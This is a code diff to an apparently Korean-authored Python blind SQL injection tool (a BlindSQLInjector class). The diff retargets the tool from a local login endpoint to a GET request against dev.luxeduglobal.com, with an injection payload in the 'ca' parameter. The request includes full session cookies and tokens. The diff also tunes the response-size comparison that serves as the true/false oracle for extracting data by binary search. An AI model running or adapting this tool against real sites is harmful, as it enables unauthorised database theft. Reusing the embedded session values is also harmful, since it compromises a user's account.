@@ -10,21 +10,22 @@ from time import sleep
 
 warnings.filterwarnings('ignore')
 
+length = 200
+
+
 ########################################################################################################
 ############################################### JSON 타입 ###############################################
 
 REQUEST_STRING = """
-POST /api/login HTTP/1.1
-Host: 192.168.219.100:5001
-Content-Length: 44
-User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36
-Content-Type: application/json
-Accept: */*
-Origin: http://192.168.219.100:5001
-Accept-Language: ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7
+GET /e_library/lg_brands?ca=1234)+or+1=2+--+&search= HTTP/1.1
+host: dev.luxeduglobal.com
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Referer: http://dev.luxeduglobal.com/e_library/lg_brands?ca=&search=belif
+Cookie: _fwb=43KIdndcVp5BklwmUAoBg1.1747704066584; _ga=GA1.1.1678676152.1747704067; _fwb=43KIdndcVp5BklwmUAoBg1.1747704066584; remem_id=Y; id=scorp001; session_member=gn7bt7rpdlj0me85mgsnbpc2rfvpd7uu; _mi=fb01f4ff2d3e4381c35a7997760a54d16584a6b1989e9a7e22f949c1a876c553184dba1b7a9f3b2c7b82ef5a32e3996c5aff7bcdf392e8b0fc15a041b356b1ebnnsxsG8Vd03e6A9MM%2BGQ01k%2BeH3iOVpnCZAEjK8uBlQ%3D; wcs_bt=11fd4821c799ac0:1747892437; _ga_SPQL5PKLB6=GS2.1.s1747878881$o12$g1$t1747892437$j0$l0$h0
 Connection: keep-alive
 
-{"username":"'or 1=2 -- ","password":"1234"}
 """
 
 # ############################################### GET 방식 ###############################################
@@ -451,9 +452,9 @@ class BlindSQLInjector:
                     response = requests.request(method, full_url, headers=headers, data=data_params, proxies=proxies, timeout=timeout, verify=False)
                     
                 check_message_size = len(response.content)
-                
             #응답 크기가 기준선과 다른 경우 true
-            return self.false_message_size != check_message_size
+            # print("기준 : " + str(self.false_message_size) + " 응답 : " + str(check_message_size))
+            return (check_message_size - self.false_message_size) > length # 응답길이 - 기준길이 > 200 = True
             
         except requests.exceptions.RequestException as e:
             print(f"{Colors.LIGHT_BLUE}[-] Connection error: {e}{Colors.END}")
@@ -478,6 +479,7 @@ class BlindSQLInjector:
         
         # 요청을 보내고 결과를 얻습니다
         bin_result = self.send_request(data_val)
+        # print(bin_result)
         
         # 기본 케이스 - 범위가 좁아지면 1
         if max_val - min_val <= 1:
@@ -485,11 +487,9 @@ class BlindSQLInjector:
         
         # 재귀 검색
         if bin_result:
-            return self.binary_search(mid_val, max_val, data_val, payload_fix, substr_index, rows_, 
-                                    select_db, select_table, select_column)
+            return self.binary_search(mid_val, max_val, data_val, payload_fix, substr_index, rows_, select_db, select_table, select_column)
         else:
-            return self.binary_search(min_val, mid_val, data_val, payload_fix, substr_index, rows_, 
-                                    select_db, select_table, select_column)
+            return self.binary_search(min_val, mid_val, data_val, payload_fix, substr_index, rows_, select_db, select_table, select_column)
 
     def execute_injection(self):
         # 구문 분석 요청 및 기준선 설정
